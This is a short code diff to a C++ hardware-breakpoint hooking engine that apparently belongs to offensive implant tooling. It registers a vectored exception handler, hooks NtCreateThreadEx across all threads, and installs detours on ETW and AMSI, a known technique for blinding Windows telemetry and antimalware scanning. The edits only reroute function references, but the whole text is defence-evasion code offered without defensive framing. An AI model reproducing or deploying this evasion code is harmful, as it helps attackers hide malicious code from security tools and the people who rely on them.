@@ -250,7 +250,7 @@ auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
     Mem::Zero( U_PTR( Threads ), sizeof( DESCRIPTOR_HOOK ) );
 
     Handler = Self->Krnl32.AddVectoredExceptionHandler( 
-        1, (PVECTORED_EXCEPTION_HANDLER)MainHandler 
+        1, (PVECTORED_EXCEPTION_HANDLER)Self->Hw->MainHandler 
     );
 
     Self->Krnl32.InitializeCriticalSection( &CritSec );
@@ -352,7 +352,7 @@ auto DECLFN HwbpEng::HookCallback(
 auto DECLFN HwbpEng::AddNewThreads(
     _In_ INT8 Drx
 ) -> BOOL {
-    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)NtCreateThreadExHk, HW_ALL_THREADS );
+    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)Self->Hw->NtCreateThreadExHk, HW_ALL_THREADS );
 }
 
 auto DECLFN HwbpEng::RmNewThreads(
@@ -371,7 +371,7 @@ auto DECLFN HwbpEng::NtCreateThreadExHk(
 
     SET_ARG_7( Ctx, Flags );
 
-    Self->Ntdll.RtlCreateTimer( &Timer, NULL, (WAITORTIMERCALLBACKFUNC)HookCallback, Handle, 0, 0, 0 );
+    Self->Ntdll.RtlCreateTimer( &Timer, NULL, (WAITORTIMERCALLBACKFUNC)Self->Hw->HookCallback, Handle, 0, 0, 0 );
 
     CONTINUE_EXEC( Ctx );
 }
@@ -379,8 +379,8 @@ auto DECLFN HwbpEng::NtCreateThreadExHk(
 auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
     if( !Init() ) return FALSE;
 
-    Install( Self->Hw->Etw.Handle, Dr1, (PVOID)EtwDetour, HW_ALL_THREADS );
-    Install( Self->Hw->Amsi.Handle, Dr2, (PVOID)AmsiDetour, HW_ALL_THREADS );
+    Install( Self->Hw->Etw.Handle, Dr1, (PVOID)Self->Hw->EtwDetour, HW_ALL_THREADS );
+    Install( Self->Hw->Amsi.Handle, Dr2, (PVOID)Self->Hw->AmsiDetour, HW_ALL_THREADS );
     return AddNewThreads( Dr0 );
 }
 
